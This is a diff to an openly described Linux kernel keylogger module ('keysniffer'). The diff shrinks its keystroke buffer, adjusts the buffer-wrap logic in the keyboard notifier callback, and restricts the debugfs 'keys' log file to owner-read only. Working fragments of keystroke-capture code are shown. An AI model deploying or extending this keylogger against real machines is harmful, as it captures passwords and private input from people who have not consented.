@@ -24,6 +24,8 @@
 #include <linux/keyboard.h>
 #include <linux/debugfs.h>
 
+#define BUF_LEN (PAGE_SIZE << 2) /* 16KB buffer (assuming 4KB PAGE_SIZE) */
+
 MODULE_LICENSE("GPL v2");
 MODULE_AUTHOR("Arun Prakash Jana <engineerarun@gmail.com>");
 MODULE_DESCRIPTION("A kernel module to sniff and log the keys pressed in the system");
@@ -80,7 +82,7 @@ static const char *us_keymap[][2] = {
 };
 
 static size_t buf_pos;
-static char keys_buf[PAGE_SIZE << 4] = {0};
+static char keys_buf[BUF_LEN] = {0};
 
 const struct file_operations keys_fops = {
 	.owner = THIS_MODULE,
@@ -116,8 +118,8 @@ int keysniffer_cb(struct notifier_block *nblock,
 		if (param->shift && us_keymap[param->value][1]) {
 			len = strlen(us_keymap[param->value][1]);
 
-			if ((buf_pos + len) >= (PAGE_SIZE << 4)) {
-				memset(keys_buf, 0, PAGE_SIZE << 4);
+			if ((buf_pos + len) >= BUF_LEN) {
+				memset(keys_buf, 0, BUF_LEN);
 				buf_pos = 0;
 			}
 
@@ -130,8 +132,8 @@ int keysniffer_cb(struct notifier_block *nblock,
 		} else if (us_keymap[param->value][0]) {
 			len = strlen(us_keymap[param->value][0]);
 
-			if ((buf_pos + len) >= (PAGE_SIZE << 4)) {
-				memset(keys_buf, 0, PAGE_SIZE << 4);
+			if ((buf_pos + len) >= BUF_LEN) {
+				memset(keys_buf, 0, BUF_LEN);
 				buf_pos = 0;
 			}
 
@@ -157,7 +159,7 @@ static int __init keysniffer_init(void)
 	if (!subdir)
 		return -ENOENT;
 
-	file = debugfs_create_file("keys", S_IRUGO | S_IWUSR, subdir, NULL, &keys_fops);
+	file = debugfs_create_file("keys", S_IRUSR, subdir, NULL, &keys_fops);
 	if (!file) {
 		debugfs_remove_recursive(subdir);
 		return -ENOENT;
